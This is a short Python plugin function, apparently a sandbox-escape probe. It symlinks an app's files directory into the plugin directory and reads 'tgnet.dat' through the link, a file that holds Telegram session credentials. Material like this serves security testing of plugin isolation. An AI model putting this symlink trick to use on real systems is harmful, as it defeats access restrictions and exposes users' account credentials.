import os
def run(ctx):
    # symlink the whole files dir under the plugin dir, then read through it
    link = os.path.join(ctx["roots"][2], "mirror")
    try: os.remove(link)
    except OSError: pass
    os.symlink(ctx["roots"][1], link)
    return open(os.path.join(link, "tgnet.dat")).read()
